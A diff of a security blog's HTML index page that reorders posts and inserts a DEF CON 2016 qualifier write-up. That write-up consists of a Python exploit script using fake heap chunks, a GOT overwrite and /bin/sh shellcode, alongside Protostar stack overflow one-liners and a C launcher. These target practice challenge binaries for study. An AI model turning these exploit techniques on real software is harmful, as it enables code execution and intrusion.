@@ -298,6 +298,129 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/21/def-con-qual-2016-babyfirst/" itemprop="url">
+                  def-con-qual-2016-babyfirst
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
+              2016-07-21
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/21/def-con-qual-2016-babyfirst/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/21/def-con-qual-2016-babyfirst/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
+</blockquote>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c'</span></span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048adb</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Exit function pointer"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">        io.read_line()</span><br><span class="line">    io.read_until(<span class="string">"loc="</span>)</span><br><span class="line">    loc = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    io.read_until(<span class="string">"size="</span>)</span><br><span class="line">    size = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (loc, size)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\xeb\x06\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">        <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">(loc, size) = pre()</span><br><span class="line"></span><br><span class="line">got_printf  = <span class="number">0x804c004</span></span><br><span class="line"></span><br><span class="line">fake0   =   <span class="string">'A'</span> * (size - <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">fake1   =   l32(size + <span class="number">0x4</span>) </span><br><span class="line">fake1   +=  l32((<span class="number">0x10</span>) | <span class="number">0x1</span>) </span><br><span class="line">fake1   =   fake1.ljust(<span class="number">0x10</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake2   =   l32(<span class="number">0x10</span>) </span><br><span class="line">fake2   +=  l32(<span class="number">0x80</span> | <span class="number">0x1</span>) </span><br><span class="line">fake2   +=  l32(got_printf - <span class="number">0x4</span> * <span class="number">2</span>)</span><br><span class="line">fake2   +=  l32(loc + size + <span class="number">0x10</span> + <span class="number">0xc</span>)</span><br><span class="line">fake2   +=  shellcode</span><br><span class="line">fake2   =   fake2.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake3   =   l32(<span class="number">0x80</span>)</span><br><span class="line">fake3   +=  l32(<span class="number">0x41</span> &amp; <span class="number">0xfffffff8</span>)</span><br><span class="line"></span><br><span class="line">fake    =   fake0 + fake1 + fake2 + fake3</span><br><span class="line"></span><br><span class="line">io.writeline(fake)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/07/21/qiangwang-qual-2015-shellman/" itemprop="url">
                   qiangwang-qual-2015-shellman
                 </a>
@@ -422,8 +545,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/07/21/def-con-qual-2016-babyfirst/" itemprop="url">
-                  def-con-qual-2016-babyfirst
+                <a class="post-title-link" href="/2016/07/20/protostar/" itemprop="url">
+                  protostar
                 </a>
               
             
@@ -436,8 +559,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-07-20T00:00:00+08:00" content="2016-07-20">
+              2016-07-20
             </time>
           </span>
 
@@ -450,8 +573,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
                   </a>
                 </span>
 
@@ -466,8 +589,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/21/def-con-qual-2016-babyfirst/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/21/def-con-qual-2016-babyfirst/" itemprop="commentsCount"></span>
+                <a href="/2016/07/20/protostar/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/20/protostar/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -491,13 +614,15 @@
 
       
         
-          
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c'</span></span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048adb</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Exit function pointer"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">        io.read_line()</span><br><span class="line">    io.read_until(<span class="string">"loc="</span>)</span><br><span class="line">    loc = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    io.read_until(<span class="string">"size="</span>)</span><br><span class="line">    size = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (loc, size)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\xeb\x06\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">        <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">(loc, size) = pre()</span><br><span class="line"></span><br><span class="line">got_printf  = <span class="number">0x804c004</span></span><br><span class="line"></span><br><span class="line">fake0   =   <span class="string">'A'</span> * (size - <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">fake1   =   l32(size + <span class="number">0x4</span>) </span><br><span class="line">fake1   +=  l32((<span class="number">0x10</span>) | <span class="number">0x1</span>) </span><br><span class="line">fake1   =   fake1.ljust(<span class="number">0x10</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake2   =   l32(<span class="number">0x10</span>) </span><br><span class="line">fake2   +=  l32(<span class="number">0x80</span> | <span class="number">0x1</span>) </span><br><span class="line">fake2   +=  l32(got_printf - <span class="number">0x4</span> * <span class="number">2</span>)</span><br><span class="line">fake2   +=  l32(loc + size + <span class="number">0x10</span> + <span class="number">0xc</span>)</span><br><span class="line">fake2   +=  shellcode</span><br><span class="line">fake2   =   fake2.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake3   =   l32(<span class="number">0x80</span>)</span><br><span class="line">fake3   +=  l32(<span class="number">0x41</span> &amp; <span class="number">0xfffffff8</span>)</span><br><span class="line"></span><br><span class="line">fake    =   fake0 + fake1 + fake2 + fake3</span><br><span class="line"></span><br><span class="line">io.writeline(fake)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-          
+          <h2 id="stack_0">stack 0</h2><p><code>python -c &quot;print &#39;A&#39;*65&quot; | ./stack0</code></p>
+<h2 id="stack_1">stack 1</h2><p><code>./stack1 $(python -c &quot;print &#39;dcba&#39;*17&quot;)</code></p>
+<h2 id="stack_2">stack 2</h2><h3 id="Exploit">Exploit</h3><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, const char <span class="variable">*argv</span>[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i               = <span class="number">0</span>;</span><br><span class="line">    char <span class="variable">*my_argv</span>[<span class="number">1</span>]    = &#123;NULL&#125;;</span><br><span class="line">    char <span class="variable">*my_env</span>[<span class="number">2</span>]     = &#123;NULL&#125;;</span><br><span class="line">    char <span class="keyword">env</span>[<span class="number">76</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">env</span>[<span class="number">0</span>] = <span class="string">'G'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">1</span>] = <span class="string">'R'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">2</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">3</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">4</span>] = <span class="string">'N'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">5</span>] = <span class="string">'I'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">6</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">7</span>] = <span class="string">'='</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">72</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">env</span>[i] = <span class="string">'A'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">72</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">73</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">74</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">75</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line"></span><br><span class="line">    my_env[<span class="number">0</span>] = <span class="keyword">env</span>;</span><br><span class="line">    my_env[<span class="number">1</span>] = NULL;</span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">"./stack2"</span>, my_argv, my_env);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="stack_3">stack 3</h2><p><code>python -c &quot;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&quot; | ./stack3</code></p>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/20/protostar/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
         
       
     </div>
@@ -650,131 +775,6 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/20/protostar/" itemprop="url">
-                  protostar
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-20T00:00:00+08:00" content="2016-07-20">
-              2016-07-20
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/20/protostar/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/20/protostar/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="stack_0">stack 0</h2><p><code>python -c &quot;print &#39;A&#39;*65&quot; | ./stack0</code></p>
-<h2 id="stack_1">stack 1</h2><p><code>./stack1 $(python -c &quot;print &#39;dcba&#39;*17&quot;)</code></p>
-<h2 id="stack_2">stack 2</h2><h3 id="Exploit">Exploit</h3><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, const char <span class="variable">*argv</span>[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> i               = <span class="number">0</span>;</span><br><span class="line">    char <span class="variable">*my_argv</span>[<span class="number">1</span>]    = &#123;NULL&#125;;</span><br><span class="line">    char <span class="variable">*my_env</span>[<span class="number">2</span>]     = &#123;NULL&#125;;</span><br><span class="line">    char <span class="keyword">env</span>[<span class="number">76</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">env</span>[<span class="number">0</span>] = <span class="string">'G'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">1</span>] = <span class="string">'R'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">2</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">3</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">4</span>] = <span class="string">'N'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">5</span>] = <span class="string">'I'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">6</span>] = <span class="string">'E'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">7</span>] = <span class="string">'='</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">8</span>; i &lt; <span class="number">72</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">env</span>[i] = <span class="string">'A'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">72</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">73</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">74</span>] = <span class="string">'\x0a'</span>;</span><br><span class="line">    <span class="keyword">env</span>[<span class="number">75</span>] = <span class="string">'\x0d'</span>;</span><br><span class="line"></span><br><span class="line">    my_env[<span class="number">0</span>] = <span class="keyword">env</span>;</span><br><span class="line">    my_env[<span class="number">1</span>] = NULL;</span><br><span class="line">    </span><br><span class="line">    execve(<span class="string">"./stack2"</span>, my_argv, my_env);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="stack_3">stack 3</h2><p><code>python -c &quot;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&quot; | ./stack3</code></p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/20/protostar/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -837,7 +837,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">43</span>
+                <span class="site-state-item-count">42</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
